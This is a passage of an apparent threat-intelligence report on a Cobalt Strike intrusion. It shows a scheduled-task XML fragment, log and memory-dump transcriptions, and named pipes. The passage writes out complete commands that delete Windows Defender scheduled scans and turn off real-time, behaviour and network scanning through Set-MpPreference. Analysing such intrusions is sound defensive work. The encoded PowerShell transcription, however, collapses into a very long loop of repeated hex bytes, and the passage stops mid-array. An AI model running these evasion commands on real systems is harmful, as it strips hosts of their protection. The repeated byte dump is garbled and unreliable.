</Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n      <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n      <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n      <AllowHardTerminate>true</AllowHardTerminate>\n      <StartWhenAvailable>false</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>PT10M</Duration>\n        <WaitTimeout>PT1H</WaitTimeout>\n        <StopOnIdleEnd>true</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Enabled>true</Enabled>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions Context=\"Author\">\n      <Exec>\n        <Command>C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</Command>\n        <Arguments>-w -n -e \n```\n\n## Defense Evasion\n\nWindows Defender scheduled scans were deleted from the system. This was observed on multiple servers the threat actor pivoted to.\n\n```image\nAlt: Windows Defender\nDescription: The image displays a textual output from a process creation log, detailing the execution of the 'schtasks.exe' command. This command was used to delete scheduled tasks related to Windows Defender, indicating a potential evasion of security measures. Key elements include the process ID, command line executed, user information, and hash values for verification. The context suggests this is part of a larger discussion on defense evasion tactics employed by threat actors.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime:\n  ProcessGuid: {c26db5f6-5adc-61f9-f631-000000000060}\n  ProcessId:  3688\n  Image: C:\\Windows\\System32\\schtasks.exe\n  FileVersion:\n  Description: Task Scheduler Configuration Tool\n  Product: Microsoft Windows Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: schtasks.exe\n  CommandLine: \"C:\\Windows\\system32\\schtasks.exe\" /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  CurrentDirectory: C:\\Users\\\n  User:\n  LogonGuid: {c26db5f6-901c-61a3-bdad-030000000000}\n  LogonId: 0x3ABD8\n  TerminalSessionId: 1\n  IntegrityLevel: High\n  Hashes: SHA1=EF173058B6BD8AB7E07C1A56B63A9E504E463D2DA,MD5=8AC868920214321438EABFBDE93BC2,SHA256=1AC5741B075111E49CB1681BD3A00EEF9B03F\n  ParentProcessGuid: {c26db5f6-5aa1-61f9-e731-000000000060}\n  ParentProcessId: 9724\n  ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"\n```\n\n```\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\n```\n\nFurthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableArchiveScanning $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableIntrusionPreventionSystem $true\nSet-MpPreference -DisableScanningNetworkFiles $true\nSet-MpPreference -MAPSReporting 0\nSet-MpPreference -DisableCatchupFullScan $True\nSet-MpPreference -DisableCatchupQuickScan $True\n```\n\nAs in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.\n\n```image\nAlt: Memory Dump\nDescription: The image displays a table containing three rows and three columns. The columns are labeled 'Action Type', 'Initiating Process File Name', and 'Initiating Process Command Line'. Each row corresponds to actions involving the process 'rundll32.exe', detailing the type of action (such as 'RemoteSetThreadContextMemoryExecution' and 'RemoteExecutable MemoryAllocation') performed by or related to this process. This data is relevant to understanding the behavior of the threat actor's tools during a cyber intrusion.\nTranscription: |\n  Action Type                                      Initiating Process File Name    Initiating Process Command Line\n  RemoteSetThreadContextMemoryExecution            rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n```\n\nThis can be observed in the memory dump from the beachhead host with the tell-tale `PAGE_EXECUTE_READWRITE` protection settings on the memory space and MZ headers observable in the process memory space.\n\n```image\nAlt: Memory Dump\nDescription: The image is a screenshot of a memory dump, showing hexadecimal machine code and memory addresses related to the execution of `rundll32.exe`. Key elements include indications of `PAGE_EXECUTE_READWRITE` memory protection settings and `MZ` headers, which are characteristic of executable files. The layout consists of lines of code displaying function calls and memory operations, with specific highlights on the memory protection status and executable identifiers.\nTranscription: |\n  08 4a 40 d1 c7 7e 7f 00 00  J...@..~...\n  3420    rundll32.exe          0x3030000    0x3063fff    VadS    PAGE_EXECUTE_READWRITE    52    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3030002:    dec    ebp\n  0x3030003:    pop    ecx\n  0x3030004:    push   ebp\n  0x3030005:    inc    ebp\n  0x3030006:    push   0x303009\n  0x303000b:    pop    ebx\n  0x303000c:    add    ebx, ebx\n  0x303000e:    mov    esp, esp\n  0x3030010:    mov    ebp, esp\n  0x3030012:    push   0x7d445\n  0x3030017:    call   0x56a2b5f0\n  ...\n  0x3030021:    push   edi\n  0x3030022:    call   eax\n  0x3030024:    add    byte ptr [eax], al\n  0x3030026:    add    byte ptr [eax], al\n  0x3030028:    add    byte ptr [eax], al\n  0x303002a:    add    byte ptr [eax], al\n  0x303002c:    add    byte ptr [eax], al\n  0x303002e:    add    byte ptr [eax], al\n  0x3030030:    add    byte ptr [eax], al\n  0x3030032:    add    byte ptr [eax], al\n  0x3030034:    add    byte ptr [eax], al\n  0x3030036:    add    byte ptr [eax], al\n  0x3030038:    add    byte ptr [eax], al\n  3420    rundll32.exe          0x3260000    0x329dfff    VadS    PAGE_EXECUTE_READWRITE    62    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3260001:    pop    edx\n  0x3260002:    dec    ebp\n  0x3260003:    pop    ecx\n  0x3260004:    push   ebp\n  0x3260005:    inc    ebp\n  0x3260006:    push   0x3260009\n  0x326000b:    pop    ebx\n  0x326000c:    add    ebx, ebx\n  0x326000e:    mov    esp, esp\n  0x3260010:    mov    ebp, esp\n  0x3260012:    push   0x7d445\n  0x3260017:    call   0x56a2b5f0\n  ...\n  0x3260021:    push   edi\n  0x3260022:    call   eax\n  0x3260024:    add    byte ptr [eax], al\n  0x3260026:    add    byte ptr [eax], al\n  0x3260028:    add    byte ptr [eax], al\n  0x326002a:    add    byte ptr [eax], al\n  0x326002c:    add    byte ptr [eax], al\n  0x326002e:    add    byte ptr [eax], al\n  0x3260030:    add    byte ptr [eax], al\n  0x3260032:    add    byte ptr [eax], al\n  0x3260034:    add    byte ptr [eax], al\n  0x3260036:    add    byte ptr [eax], al\n  0x3260038:    add    byte ptr [eax], al\n  7132    rundll32.exe          0xa700000    0xa90fff    VadS    PAGE_EXECUTE_READWRITE    33    1    Disabled\n  ...\n  4d 5a 90 00 03 00 00 00 04 00  MZARUH.\n  bd 1f 4c ef 20 00 00 00 00 00  ..L. ....\n  ...\n  a8 81 c1 f2 00 00 00 00 00 00  ..........\n  ...\n  03 5a 6f f1 01 48 00 00 00 00  .Zo..H....\n  ...\n  5a ff d3 00 00 00 00 00 00 00  Z.........\n  0xa700000:    pop    r10\n```\n\nDuring the intrusion, we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.\n\n```\nPipeName: \\msagent_ld\nPipeName: \\1ea887\n```\n\nThe threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.\n\n```image\nAlt: Encoded Powershell\nDescription: The image displays a detailed output from a PowerShell process creation event. It includes various technical attributes such as the Process GUID, Process ID, image path, file version, description, and command line used. The command line contains obfuscated code involving hexadecimal values, indicating potential malicious intent. Additionally, it lists user information, terminal session ID, integrity level, and hash values related to the process, showcasing the technical details of the executed PowerShell command.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime: \n  ProcessGuid: {bb28eb5f-a41e-61f9-8445-000000000508}\n  ProcessId: 6268\n  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  FileVersion: \n  Description: Windows PowerShell\n  Product: Microsoft Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: PowerShell.EXE\n  CommandLine: powershell -nop -non -ep bypass -w h -c \"&([scriptblock]::Create(([0x34,0x73,0x2d,0x5e,0x75,0x67,0x3d,0x5f,0x72,0x7a,0x75,0x6d,0x64,0x30,0x53,0x7f,0x7d,0x7c,0x3e,0x43,0x75,0x62,0x66,0x75,0x6f,0x2c,0x8d,0x7c,0x58,0x64,0x64,0x6e,0x75,0x6e,0x38,0x37,0x55,0x44,0x3c,0x37,0x8c,0x37,0x68,0x74,0x68,0x6e,0x43,0x75,0x6f,0x75,0x6d,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75